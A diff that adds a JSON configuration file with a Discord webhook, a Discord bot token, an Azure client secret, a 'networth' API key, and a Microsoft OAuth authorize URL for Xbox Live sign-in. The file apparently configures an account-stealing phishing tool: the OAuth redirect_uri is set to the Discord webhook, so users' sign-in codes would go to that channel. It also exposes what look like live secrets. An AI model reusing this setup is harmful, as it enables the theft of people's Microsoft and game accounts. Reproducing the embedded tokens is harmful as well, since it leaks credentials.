@@ -1,0 +1,20 @@
+{
+    "networth": {
+        "apiKey": "6e456749-1bc9-402a-a9d4-dc0fa80594dd"
+    },
+    "URLS": {
+        "redirect_uri": "",
+        "apiURL": ""
+    },
+    "webhook": {
+        "webhookURL": "https://discord.com/api/webhooks/1372695250082074634/AjRCboiKgXipStPT0vJU-KYftQ2ovy4BULCf8MjfRNPcxvGCZZPT_D8dHFuMdzjMm5HE"
+    },
+    "discord": {
+        "bot_token": "MTM3MjcyMjMwNjY4OTkyOTIzNw.GWHBjt.9A42KvEoxxH6W0dwCZ-FtONAun8IBgI_jPgPaM"
+    },
+    "azure" : {
+        "client_id": "https://login.live.com/oauth20_authorize.srf?client_id=9d74180d-ce72-4b9a-b3dc-d69fef37192c&response_type=code&redirect_uri=https://discord.com/api/webhooks/1372695250082074634/AjRCboiKgXipStPT0vJU-KYftQ2ovy4BULCf8MjfRNPcxvGCZZPT_D8dHFuMdzjMm5HEurl&scope=XboxLive.signin+offline_access&state=OK",
+        "client_secret": "4028d1bc-9a5e-450d-b2ba-f16be57f1f7f",
+        "redirect_uri": "https://discord.com/api/webhooks/1372695250082074634/AjRCboiKgXipStPT0vJU-KYftQ2ovy4BULCf8MjfRNPcxvGCZZPT_D8dHFuMdzjMm5HE"
+    }
+}
